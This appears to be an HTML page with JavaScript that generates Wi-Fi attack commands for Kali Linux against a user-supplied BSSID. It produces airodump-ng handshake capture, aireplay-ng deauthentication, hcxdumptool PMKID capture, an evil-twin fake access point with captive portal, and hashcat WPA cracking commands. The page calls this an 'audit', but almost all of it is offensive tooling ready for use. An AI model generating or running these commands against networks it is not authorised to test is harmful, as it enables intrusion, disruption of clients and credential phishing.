<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Kali Wi-Fi Command Generator</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<style>
:root{
  --bg:#0f1220;--card:#171a2b;--line:#24284a;
  --txt:#e6e8ff;--muted:#9aa0ff;--acc:#4f8cff;
}
*{box-sizing:border-box}
body{
  margin:0;
  font-family:system-ui,-apple-system,Segoe UI,Roboto;
  background:var(--bg);
  color:var(--txt);
}
.wrapper{
  max-width:420px;
  margin:auto;
  padding:12px;
}
h1{font-size:20px;margin:8px 0}
.small{font-size:12px;color:var(--muted);margin-bottom:8px}

.card{
  background:var(--card);
  border:1px solid var(--line);
  border-radius:12px;
  padding:12px;
  margin-bottom:12px;
  overflow:hidden; /* iOS overflow fix */
}
.card h2{font-size:15px;margin:0 0 8px}

label{
  font-size:13px;
  color:var(--muted);
}

input,select,textarea{
  width:100%;
  margin-top:4px;
  margin-bottom:8px;
  background:#0b0d1a;
  color:var(--txt);
  border:1px solid var(--line);
  border-radius:8px;
  padding:10px;
  font-size:14px;
}

textarea{
  min-height:130px;
  font-family:ui-monospace,monospace;
  white-space:pre-wrap;
}

/* Toggle rows */
.toggle{
  display:flex;
  align-items:flex-start;
  gap:10px;
  font-size:13px;
  margin-bottom:6px;
}
.toggle span{
  display:block;
  word-break:break-word;
  overflow-wrap:anywhere;
  max-width:100%;
}

button{
  width:100%;
  padding:14px;
  background:var(--acc);
  color:#fff;
  border:none;
  border-radius:12px;
  font-size:16px;
  font-weight:600;
}

pre{
  background:#050610;
  border-radius:10px;
  padding:12px;
  font-size:12px;
  overflow:auto;
  white-space:pre-wrap;
}

.sticky{
  position:sticky;
  bottom:0;
  background:linear-gradient(#0000,#0008);
  padding-top:8px;
}
</style>
</head>

<body>
<div class="wrapper">

<h1>ðŸ“¡ Kali Wi-Fi Command Generator</h1>
<div class="small">
wlan1 = monitor assumed Â· wlan0 untouched (SSH safe)
</div>

<!-- TARGET -->
<div class="card">
<h2>Target</h2>
<label>BSSID</label>
<input id="bssid" placeholder="AA:BB:CC:DD:EE:FF">

<label>Channel</label>
<input id="channel" placeholder="6">

<label>Output prefix</label>
<input id="out" value="audit">
</div>

<!-- SCAN -->
<div class="card">
<h2>Scan / Capture</h2>

<div class="toggle">
  <input type="checkbox" id="scan" checked>
  <span>Passive scan</span>
</div>

<div class="toggle">
  <input type="checkbox" id="handshake">
  <span>Handshake capture</span>
</div>

<div class="toggle">
  <input type="checkbox" id="deauth">
  <span>Targeted deauth (optional)</span>
</div>
</div>

<!-- PMKID -->
<div class="card">
<h2>PMKID</h2>
<div class="toggle">
  <input type="checkbox" id="pmkid">
  <span>PMKID capture (no client required)</span>
</div>
</div>

<!-- EVIL TWIN -->
<div class="card">
<h2>Evil Twin / Captive</h2>
<div class="toggle">
  <input type="checkbox" id="evil">
  <span>Fake AP + captive portal</span>
</div>

<label>SSID (optional)</label>
<input id="ssid" placeholder="Clone or custom">
</div>

<!-- CRACK -->
<div class="card">
<h2>Crack</h2>

<label>Mode</label>
<select id="crackmode">
  <option value="">None</option>
  <option value="wordlist">Wordlist</option>
  <option value="mask">Mask (no wordlist)</option>
  <option value="rule">Rule-based</option>
  <option value="inc">Incremental</option>
</select>

<label>Wordlist / Rule / Mask</label>
<input id="crackopt" placeholder="rockyou.txt / ?l?l?d?d / rules/best64.rule">

<label>Hashcat mode</label>
<select id="hashmode">
  <option value="22000">22000 (WPA-PBKDF2)</option>
  <option value="16800">16800 (legacy)</option>
</select>
</div>

<!-- OUTPUT -->
<div class="card">
<h2>Generated Script</h2>
<pre id="outbox"></pre>
</div>

<div class="sticky">
<button onclick="generate()">Generate Commands</button>
</div>

</div>

<script>
function generate(){
let b=[];
let B=bssid.value.trim();
let C=channel.value.trim();
let O=out.value.trim()||"audit";

b.push("# === Kali Wi-Fi Audit Script ===");
b.push("# wlan1: monitor mode assumed");
b.push("# wlan0: untouched (SSH safe)");
b.push("");

if(scan.checked){
  b.push("# Passive scan");
  b.push(`airodump-ng wlan1${C?` -c ${C}`:""}${B?` --bssid ${B}`:""} -w ${O}_scan`);
  b.push("");
}

if(handshake.checked){
  b.push("# Handshake capture");
  b.push(`airodump-ng wlan1${C?` -c ${C}`:""} --bssid ${B} -w ${O}_hs`);
  if(deauth.checked){
    b.push("# Optional targeted deauth");
    b.push(`aireplay-ng --deauth 5 -a ${B} wlan1`);
  }
  b.push("");
}

if(pmkid.checked){
  b.push("# PMKID capture");
  b.push(`hcxdumptool -i wlan1 -o ${O}_pmkid.pcapng --enable_status=1`);
  b.push(`hcxpcapngtool -o ${O}.22000 ${O}_pmkid.pcapng`);
  b.push("");
}

if(evil.checked){
  b.push("# Evil Twin / Captive Portal");
  b.push(`# SSID: ${ssid.value||"clone target"}`);
  b.push("hostapd hostapd.conf");
  b.push("dnsmasq -C dnsmasq.conf");
  b.push("");
}

if(crackmode.value){
  b.push("# Offline crack");
  let m=hashmode.value;
  let opt=crackopt.value;
  if(crackmode.value==="wordlist")
    b.push(`hashcat -m ${m} ${O}.22000 ${opt}`);
  if(crackmode.value==="mask")
    b.push(`hashcat -m ${m} ${O}.22000 ${opt}`);
  if(crackmode.value==="rule")
    b.push(`hashcat -m ${m} ${O}.22000 ${opt} -r ${opt}`);
  if(crackmode.value==="inc")
    b.push(`hashcat -m ${m} ${O}.22000 -a 3 ${opt}`);
  b.push("");
}

b.push("# Cleanup not required");
outbox.textContent=b.join("\n");
}
</script>

</body>
</html>
